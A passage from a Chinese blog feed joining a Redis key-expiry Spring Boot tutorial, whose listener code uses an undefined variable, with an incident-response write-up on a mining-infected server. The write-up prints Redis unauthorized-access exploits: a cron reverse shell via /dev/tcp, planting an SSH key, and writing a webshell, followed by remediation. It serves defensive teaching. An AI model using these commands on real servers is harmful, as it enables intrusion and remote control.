&lt;p&gt;notify-keyspace-events 的参数可以是以下字符的&lt;strong&gt;任意组合&lt;/strong&gt;， 它指定了服务器该发送哪些类型的通知。&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;字符&lt;/th&gt;
&lt;th&gt;发送的通知&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;7&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;K&lt;/td&gt;
&lt;td&gt;键空间通知，所有通知以 &lt;strong&gt;keyspace@&lt;/strong&gt; 为前缀&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;E&lt;/td&gt;
&lt;td&gt;键事件通知，所有通知以 &lt;strong&gt;keyevent@&lt;/strong&gt; 为前缀&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;g&lt;/td&gt;
&lt;td&gt;DEL 、 EXPIRE 、 RENAME 等类型无关的通用命令的通知&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;$&lt;/td&gt;
&lt;td&gt;字符串命令的通知&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;l&lt;/td&gt;
&lt;td&gt;列表命令的通知&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;s&lt;/td&gt;
&lt;td&gt;集合命令的通知&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;h&lt;/td&gt;
&lt;td&gt;哈希命令的通知&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;z&lt;/td&gt;
&lt;td&gt;有序集合命令的通知&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;x&lt;/td&gt;
&lt;td&gt;过期事件：每当有过期键被删除时发送&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;e&lt;/td&gt;
&lt;td&gt;驱逐(evict)事件：每当有键因为 maxmemory 政策而被删除时发送&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;A&lt;/td&gt;
&lt;td&gt;参数 g$lshzxe 的别名&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 id=&quot;三、coding&quot;&gt;三、Coding&lt;/h2&gt;
&lt;ol readability=&quot;25&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;初始化一个&lt;code&gt;Spring Boot&lt;/code&gt;项目&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;code&gt;pom.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;dependencies&amp;gt;
                &amp;lt;dependency&amp;gt;
                        &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
                        &amp;lt;artifactId&amp;gt;spring-boot-starter-data-redis&amp;lt;/artifactId&amp;gt;
                &amp;lt;/dependency&amp;gt;
                &amp;lt;dependency&amp;gt;
                        &amp;lt;groupId&amp;gt;org.projectlombok&amp;lt;/groupId&amp;gt;
                        &amp;lt;artifactId&amp;gt;lombok&amp;lt;/artifactId&amp;gt;
                &amp;lt;/dependency&amp;gt;
        &amp;lt;/dependencies&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;定义配置类&lt;code&gt;RedisListenerConfig&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Configuration
public class RedisListenerConfig {

        @Bean
        RedisMessageListenerContainer container(RedisConnectionFactory connectionFactory) {
                RedisMessageListenerContainer container = new RedisMessageListenerContainer();
                container.setConnectionFactory(connectionFactory);
                return container;
        }

}
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;10&quot;&gt;
&lt;p&gt;定义数据生产类&lt;code&gt;ProviderDataToRedis&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Slf4j
@Component
public class ProviderDataToRedis implements CommandLineRunner {

        @Autowired
        private StringRedisTemplate stringRedisTemplate;

        @Override
        public void run(String... args) throws Exception {
                int[] num = new int[]{1};
                Random random = new Random();
                while (true) {
                        int max = random.nextInt(5);
                        IntStream.range(0, max).forEach(n -&amp;gt; stringRedisTemplate.opsForValue().set(String.format(&quot;mq:s1:%s&quot;, ++num[0]), &quot;已预订&quot;, 5, TimeUnit.SECONDS));
                        log.info(&quot;放了 {} 条数据到redis...&quot;, max);
                        TimeUnit.SECONDS.sleep(3);
                }
        }
}
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;28&quot;&gt;
&lt;p&gt;定义监听器 实现&lt;code&gt;KeyExpirationEventMessageListener&lt;/code&gt;接口&lt;/p&gt;
&lt;p&gt;查看源码发现，该接口监听所有db的过期事件&lt;code&gt;keyevent@*:expired&quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;定义&lt;code&gt;Status1ExpirationListener&lt;/code&gt;监听状态1到期&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Slf4j
@Component
public class Status1ExpirationListener extends KeyExpirationEventMessageListener {

        public Status1ExpirationListener(RedisMessageListenerContainer listenerContainer) {
                super(listenerContainer);
        }

        @Autowired
        private StringRedisTemplate stringRedisTemplate;

        @Override
        public void onMessage(Message message, byte[] pattern) {
                // 用户做自己的业务处理即可,注意message.toString()可以获取失效的key
                String expiredKey = message.toString();
                if (expiredKey.startsWith(&quot;mq:s1:&quot;)) {
                        log.info(&quot;-----------------------------------&quot;);
                        log.info(String.format(&quot;过期key[%s]&quot;, expiredKey));
                        String newKey = String.format(&quot;mq:s2:%s&quot;, expiredKey.substring(6));
                        String newValue = &quot;行程中&quot;;
                        stringRedisTemplate.opsForValue().set(newKey, newValue, 3, TimeUnit.SECONDS);
                        log.info(String.format(&quot;%s: %s&quot;, newKey, newValue));
                        log.info(&quot;-----------------------------------&quot;);
                }
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;定义&lt;code&gt;Status2ExpirationListener&lt;/code&gt;监听状态2到期&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Slf4j
@Component
public class Status2ExpirationListener extends KeyExpirationEventMessageListener {

        public Status2ExpirationListener(RedisMessageListenerContainer listenerContainer) {
                super(listenerContainer);
        }

        @Override
        public void onMessage(Message message, byte[] pattern) {
                // 用户做自己的业务处理即可,注意message.toString()可以获取失效的key
                String expiredKey = message.toString();
                if (expiredKey.startsWith(&quot;mq:s2:&quot;)) {
                        log.info(&quot;***********************************&quot;);
                        log.info(String.format(&quot;过期key[%s]&quot;, expiredKey));
                        log.info(&quot;[{}]行程已完成，修改数据库状态。&quot;, newKey);
                        log.info(&quot;***********************************&quot;);
                }
        }

}
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;四、测试输出&quot;&gt;四、测试输出&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;...
2021-01-25 23:16:58.012  INFO 55511 --- [           main] n.y.tools.listener.ProviderDataToRedis      : 放了 4 条数据到redis...
2021-01-25 23:17:00.037  INFO 55511 --- [ container-1070] c.i.r.l.Status1ExpirationListener        : -----------------------------------
2021-01-25 23:17:00.037  INFO 55511 --- [ container-1070] c.i.r.l.Status1ExpirationListener        : 过期key[mq:s1:272]
2021-01-25 23:17:00.037  INFO 55511 --- [ container-1072] c.i.r.l.Status1ExpirationListener        : -----------------------------------
2021-01-25 23:17:00.037  INFO 55511 --- [ container-1072] c.i.r.l.Status1ExpirationListener        : 过期key[mq:s1:271]
2021-01-25 23:17:00.039  INFO 55511 --- [ container-1070] c.i.r.l.Status1ExpirationListener        : mq:s2:272: 行程中
2021-01-25 23:17:00.039  INFO 55511 --- [ container-1072] c.i.r.l.Status1ExpirationListener        : mq:s2:271: 行程中
2021-01-25 23:17:00.039  INFO 55511 --- [ container-1070] c.i.r.l.Status1ExpirationListener        : -----------------------------------
2021-01-25 23:17:00.039  INFO 55511 --- [ container-1072] c.i.r.l.Status1ExpirationListener        : -----------------------------------
2021-01-25 23:17:00.140  INFO 55511 --- [ container-1075] c.i.r.l.Status2ExpirationListener        : ***********************************
2021-01-25 23:17:00.140  INFO 55511 --- [ container-1075] c.i.r.l.Status2ExpirationListener        : 过期key[mq:s2:270]
2021-01-25 23:17:00.140  INFO 55511 --- [ container-1075] c.i.r.l.Status2ExpirationListener        : [270]行程已完成，修改数据库状态。
2021-01-25 23:17:00.140  INFO 55511 --- [ container-1075] c.i.r.l.Status2ExpirationListener        : ***********************************
2021-01-25 23:17:00.242  INFO 55511 --- [ container-1077] c.i.r.l.Status2ExpirationListener        : ***********************************
2021-01-25 23:17:00.242  INFO 55511 --- [ container-1077] c.i.r.l.Status2ExpirationListener        : 过期key[mq:s2:269]
2021-01-25 23:17:00.242  INFO 55511 --- [ container-1079] c.i.r.l.Status2ExpirationListener        : ***********************************
2021-01-25 23:17:00.242  INFO 55511 --- [ container-1079] c.i.r.l.Status2ExpirationListener        : 过期key[mq:s2:268]
2021-01-25 23:17:00.242  INFO 55511 --- [ container-1077] c.i.r.l.Status2ExpirationListener        : [269]行程已完成，修改数据库状态。
2021-01-25 23:17:00.242  INFO 55511 --- [ container-1077] c.i.r.l.Status2ExpirationListener        : ***********************************
2021-01-25 23:17:00.242  INFO 55511 --- [ container-1079] c.i.r.l.Status2ExpirationListener        : [268]行程已完成，修改数据库状态。
2021-01-25 23:17:00.242  INFO 55511 --- [ container-1079] c.i.r.l.Status2ExpirationListener        : ***********************************
2021-01-25 23:17:00.546  INFO 55511 --- [ container-1081] c.i.r.l.Status2ExpirationListener        : ***********************************
2021-01-25 23:17:00.546  INFO 55511 --- [ container-1081] c.i.r.l.Status2ExpirationListener        : 过期key[mq:s2:267]
2021-01-25 23:17:00.546  INFO 55511 --- [ container-1081] c.i.r.l.Status2ExpirationListener        : [267]行程已完成，修改数据库状态。
2021-01-25 23:17:00.546  INFO 55511 --- [ container-1081] c.i.r.l.Status2ExpirationListener        : ***********************************
...
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;五、一直增加的线程数&quot;&gt;五、一直增加的线程数&lt;/h2&gt;
&lt;p&gt;从测试输出的日志中可以看出，线程一直在增加，这个问题还有待解决！&lt;/p&gt;
&lt;h2 id=&quot;六、参考&quot;&gt;六、参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://redisdoc.com/topic/notification.html&quot; target=&quot;_blank&quot;&gt;http://redisdoc.com/topic/notification.html&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 25 Jan 2021 15:41:00 +0000</pubDate>
<dc:creator>抱明月而长终</dc:creator>
<og:description>talk is cheap, show me the code. 一、开启Redis key过期提醒 方式二：修改配置文件 redis.conf # 默认 notify-keyspace-events</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/tanpenggood/p/14328096.html</dc:identifier>
</item>
<item>
<title>应急响应-挖矿问题 - hu1ge(micr067)</title>
<link>http://www.cnblogs.com/micr067/p/14328067.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/micr067/p/14328067.html</guid>
<description>&lt;h3 id=&quot;场景&quot;&gt;&lt;strong&gt;场景&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;​ 有客户反馈其所使用的服务器近期突然网站打开特别慢，但是网站访问人数较前期并无明显变化，服务器CPU利用率较高。同时客户接到投诉反映通过搜索引擎搜索该网站点击后会跳转到博彩网站。请协助客户分析该服务器遭受何种攻击并恢复服务器正常运行。同时帮助客户清理恶意程序，阻止黑客再次入侵。&lt;/p&gt;
&lt;p&gt;A：首先top看一下cpu内存占用情况&lt;br/&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/7620BC234AA741D89F6143E4E2339E82/126718&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;B：登录服务器先查看一下端口情况，发现开启了redis-server&lt;/p&gt;
&lt;p&gt;并且可以看到redis-server监听在0.0.0.0:6379&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/C948556E942A481FA104F6371A7DF552/126722&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;C：查看是否存在redis未授权访问&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;redis-cli -h 192.168.52.135
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看redis版本信息、一些具体信息、服务器版本信息等等：info&lt;/p&gt;
&lt;p&gt;查看所有键：KEYS *&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/86A07596B5B443389D102FF28AEA86F2/126741&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到redsi存在未授权访问&lt;/p&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/7E0A6A07D3CE459AAD937644E2573EC0/126743&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;D：判断redsi是否为root权限&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;netstat -anptl 
ps -aux| grep 30
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;发现redis是root用户启动的，且同时redis存在未授权访问&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/27E53DEA95F74F8391367E73E7F9F290/126755&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;redis未授权一般利用方式有以下三种：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一种：反弹shell&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;root@kali:~# redis-cli -h 192.168.52.135
192.168.52.135:6379&amp;gt; set xxx &quot;\n\n*/1 * * * * /bin/bash -i&amp;gt;&amp;amp;/dev/tcp/192.168.52.128/2333 0&amp;gt;&amp;amp;1\n\n&quot;     //1分钟后执行计划任务
OK
192.168.52.135:6379&amp;gt; config set dir /var/spool/cron
OK
192.168.52.135:6379&amp;gt; config set dbfilename root
OK
192.168.52.135:6379&amp;gt; save
OK
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到成功写入计划任务&lt;/p&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/A53B69F749B246AAB69D85F017BB3B1F/126803&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二种：写ssh-keygen公钥，然后使用私钥登陆&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在以下条件下，可以利用此方法&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Redis服务使用ROOT账号启动&lt;/li&gt;
&lt;li&gt;服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;首先在本地生成一对密钥：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ssh-keygen -t rsa
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/FFEB7356D1EA4DF98B8A7E20B60AD6CE/126777&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后redis执行命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;root@kali:~# redis-cli -h 192.168.52.135
192.168.52.135:6379&amp;gt; config set dir /root/.ssh/
OK
192.168.52.135:6379&amp;gt; config set dbfilename authorized_keys
OK
192.168.52.135:6379&amp;gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiF1o01tlJug4myll3sN/z3IRABopXPAIQMYnCWYxxh7Ud3sLzsSv6sufKyKS3f6Hlrbv7/av0irgwFUHOXn1cBL79SnRvsKsbY3Gqlac+FUKF4BiuHsOOp1SZwJTbYPi1wsCsGpzIAv4FC9h5GuLMgn/XR9boPBd6RyyM+NM34k+so6M1DEY69hRdVm4mspOiBMRt8XDBSGu/daaQvAZQAeE0kmKv9GcAULD06WaEoth1+pRsQ3tIB6C+9dNZEa7ODTtL44mJUqWZVEINUylzJz+LgKw3NLGP/hr1xqoj2mllThCtJJe5axxkYkE1qSf7KFHsAlqtnBoGSrJn5cD9GaT5TVU9sUi289OCQVObpzboNJ6YYAlfoMCH8VSEg6On/NYUY4+qBQdLEPj9fC/XSAOnc0wK6RZ85P8tB1E5RC3JOvZhCjDWCKbuW/cue9ukm+cOY7gvbP1OcXWhFMxw/SI64zvdECyDH0QsdT82kTKVLcVdwunDjENy1TbbCGE= root@kali\n\n\n&quot;
OK
192.168.52.135:6379&amp;gt; save
OK
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/0F5864F8760F4B5C9040DC3D4AA5F4F6/126781&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;save后可以直接利用公钥登录ssh&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[root@kali:~# cd .ssh/
[root@kali:~/.ssh# ssh -i id_rsa root@192.168.52.135
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/0D84C3056A5C4CB1BFE969ADFB20430F/126787&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三种：向web路径写webshell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell&lt;/p&gt;
&lt;p&gt;执行以下命令&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;root@kali:~# redis-cli -h 192.168.52.135
192.168.52.135:6379&amp;gt; config set dir /var/www/html/
OK
192.168.52.135:6379&amp;gt; config set dbfilename shell.php
OK
192.168.52.135:6379&amp;gt; set x &quot;&quot;
OK
192.168.52.135:6379&amp;gt; save
OK
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/A1B41F649DF742C1BC079F38BAF28F18/126794&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://172.17.0.2/shell.php
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/8AA07F5D380D45CAB17FFE6EDF2D727E/126796&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一般redis未授权修复：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;限制登录ip&lt;/li&gt;
&lt;li&gt;添加密码&lt;/li&gt;
&lt;li&gt;修改默认端口&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;1、redis未授权修复&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将redis服务改为监听本地，或为redis访问设置⼝令即可。&lt;/p&gt;
&lt;p&gt;A：首先结束掉redis服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/72D8EEBAFD02428B8B34B93FB42D4B07/126811&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;B：修改监听地址为127.0.0.1&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;root@65c7d9159ef6:~# cat /etc/redis/redis.conf

修改redis配置⽂件 将/etc/redis/redis.conf中的 #bind 127.0.0.1 改为 bind 127.0.0.1
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/8A110871DCEA4935A66FA07A83D8CDB3/126818&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;或 将/etc/redis/redis.conf中的 # requirepass foobared 改为 requirepass foobared
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/94D08BD9084145C89104E8280164A6A8/126821&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt;&lt;a href=&quot;https://www.cnblogs.com/ruozhisi/p/12199311.html&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;redis修改requirepass 参数 改密码&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.cnblogs.com/ruozhisi/p/12199311.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/ruozhisi/p/12199311.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;\1. &lt;strong&gt;不重启redis如何配置密码?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;a. 在配置文件中配置requirepass的密码（当redis重启时密码依然有效）。&lt;/p&gt;
&lt;p&gt;# requirepass foobared -》 修改成 : requirepass 123&lt;/p&gt;
&lt;p&gt;b. 进入redis重定义参数&lt;/p&gt;
&lt;p&gt;查看当前的密码：&lt;/p&gt;
&lt;p&gt;连接客户端：redis-cli&lt;/p&gt;
&lt;p&gt;redis 127.0.0.1:6379&amp;gt;&lt;/p&gt;
&lt;p&gt;redis 127.0.0.1:6379&amp;gt; config get requirepass&lt;/p&gt;
&lt;ol readability=&quot;-2&quot;&gt;&lt;li&gt;
&lt;p&gt;&quot;requirepass&quot;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;(nil) 显示密码是空的&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;c. 然后设置密码：&lt;/p&gt;
&lt;p&gt;redis 127.0.0.1:6379&amp;gt; config set requirepass 123&lt;/p&gt;
&lt;p&gt;OK&lt;/p&gt;
&lt;p&gt;d. 再次查询密码：&lt;/p&gt;
&lt;p&gt;redis 127.0.0.1:6379&amp;gt; config get requirepass&lt;/p&gt;
&lt;p&gt;(error) ERR operation not permitted&lt;/p&gt;
&lt;p&gt;此时报错了！&lt;/p&gt;
&lt;p&gt;现在只需要密码认证就可以了。&lt;/p&gt;
&lt;p&gt;redis 127.0.0.1:6379&amp;gt; auth 123&lt;/p&gt;
&lt;p&gt;OK&lt;/p&gt;
&lt;p&gt;e. 再次查询密码：&lt;/p&gt;
&lt;p&gt;redis 127.0.0.1:6379&amp;gt; config get requirepass&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;
&lt;p&gt;&quot;requirepass&quot;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&quot;test123&quot;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;修改成功&lt;/p&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/33A5B3D785534F68A6B55A97846B088A/126828&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;C：修改完配置后重新启动redis服务&lt;/p&gt;
&lt;p&gt;使⽤命令 redis-server /etc/redis/redis.conf 启动redis服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/FD948B2CD1F745D5B0252DB4A3211E22/126835&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到配置文件已经生效，我们再来验证下&lt;/p&gt;
&lt;p&gt;可以看到连接被拒绝，说明没有问题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/BCC66057A5B546AC8799C4BEB2EE124A/126840&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、使用非root用户启动redsi服务&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使⽤⾮root⽤户运⾏redis服务即可。&lt;/p&gt;
&lt;p&gt;A. 终⽌原redis进程&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ps -ef|grep redis-server|awk '{print $2}'|xargs kill -9
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/0582F16628B546819BB884BBCFE9FA66/126853&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;B.：使⽤⾮root⽤户启动redis服务，如，通过init.d中的redis管理项启动&lt;/p&gt;
&lt;p&gt;# 启动后redis-server的运⾏⽤户为redis:redis&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;root@65c7d9159ef6:~# cd /etc/init.d

root@65c7d9159ef6:/etc/init.d# ./redis-server start
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/8559EAF3E97A474AA392E33543E689EC/126857&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、挖矿进程清除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A：top&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/78A677CA15FB44E19FD6D91E2358327E/126862&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;B.：查看进程清单找出CPU占⽤⾼的进程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/9C237884B64D46B7838C5606A3CA1F3A/126875&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;root@65c7d9159ef6:~# ps -ef | grep mycoin
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;发现/usr/share/mycoin/mycoin文件运行时加载的json配置文件中包含矿池地址以及连接的用户名密码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;root@65c7d9159ef6:~# cat /usr/share/mycoin/config.json
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;{                                                                                                            
​    &quot;threads&quot;:2,                // number of miner threads
​    &quot;pools&quot;: [
​        {
​            &quot;url&quot;: &quot;stratum+tcp://u1pool.com:18888&quot;,               // URL of mining server
​            &quot;user&quot;: &quot;UP57on3ZKh6DDVUBv8d97awyrTfE8vXTF5.test01&quot;,   // username for mining server 
​            &quot;pass&quot;: &quot;x&quot;                                            // password for mining server
​        }
​    ]
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/D86960F7D85845B8920599A4228DEF1C/126864&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;C：终⽌挖矿进程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/F18CD85B6E994668811E17296E905C30/126879&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、Linux开机自启动排查&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.cnblogs.com/shigfdengys/p/11169617.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/shigfdengys/p/11169617.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A：/etc/init.d/下的脚本&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;chkconfig --list | grep mycoin
&lt;/code&gt;
&lt;/pre&gt;
